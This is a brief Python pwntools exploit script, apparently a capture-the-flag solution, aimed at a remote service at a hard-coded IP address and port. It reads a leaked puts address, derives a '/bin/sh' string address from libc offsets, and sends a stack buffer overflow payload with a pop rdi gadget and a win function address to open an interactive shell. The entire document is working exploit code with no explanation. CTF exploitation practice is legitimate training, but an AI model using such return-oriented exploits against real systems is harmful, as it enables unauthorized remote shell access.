from pwn import *

r = remote('34.123.210.162', 32006)

str_binsh_offset = 0x195152 - 0x722e0
r.recvuntil(b'puts: ')
addr_puts = int(r.recvline(), 16)

bin_sh = p64(str_binsh_offset + addr_puts)

win_addr = p64(0x401152)
pop_rdi = p64(0x40127b)

payload = b'A' * 0x40 + b'B' * 0x08 + pop_rdi + bin_sh + win_addr
r.sendline(payload)
r.interactive()